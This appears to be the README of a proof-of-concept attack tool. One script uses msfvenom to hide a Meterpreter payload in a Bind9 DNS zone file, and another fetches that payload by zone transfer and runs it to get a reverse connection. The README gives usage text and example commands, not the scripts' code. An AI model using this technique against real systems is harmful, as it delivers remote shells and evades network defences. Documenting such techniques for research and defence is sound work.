# Meterpreter Payload Delivery using DNS AXFR PoC

## Zone Gen

Zone generator. This script generates payload and converts it to bind's configuration.

### Requirements

msfvenom should be installed.

### Usage

arguments:
```
% zone-gen.py -h
usage: zone-gen.py [-h] -d DOMAIN -a IP -s SOA_ENTRIES -n NS_SERVER -o
                   OUTPUT_FILE -l LHOST -p LPORT

Bind9 zone transfer malicious payload generator

optional arguments:
  -h, --help            show this help message and exit
  -d DOMAIN, --domain DOMAIN
                        domain name for which configuration will be generated
  -a IP, --ip IP        ip name of generated domain
  -s SOA_ENTRIES, --soa-entries SOA_ENTRIES
                        soa entries
  -n NS_SERVER, --ns-server NS_SERVER
                        nameserver domain
  -o OUTPUT_FILE, --output-file OUTPUT_FILE
                        output file name
  -l LHOST, --lhost LHOST
                        local host address (remote address will connect on it)
  -p LPORT, --lport LPORT
                        local port (remote address will connect on it)
```

example usage:
```
/src/zone-gen.py -d example.com -a 127.0.0.1 -s example.com -n example.com -o /common/out.conf -l 127.0.0.1 -p 4444
```

## AXFR executor

This script takes malicious payload from remote DNS server and executes it.

### Requirements

Install requirements:

```
pip3 install -r requirements.txt
```

### Usage

```
% src/axfr-get-payload.py -h
usage: axfr-get-payload.py [-h] -o OS -d DOMAIN_NAME -s SERVER_ADDRESS

DNS zone transfer malicious payload executor

optional arguments:
  -h, --help            show this help message and exit
  -o OS, --os OS        operating system (linux or windows)
  -d DOMAIN_NAME, --domain-name DOMAIN_NAME
                        domain name which should be transfer
  -s SERVER_ADDRESS, --server-address SERVER_ADDRESS
                        DNS server address, from which zone should be transfer
```

Example usage:
```
./axfr-get-payload.py -o linux -d example.com -s 127.0.0.1
```
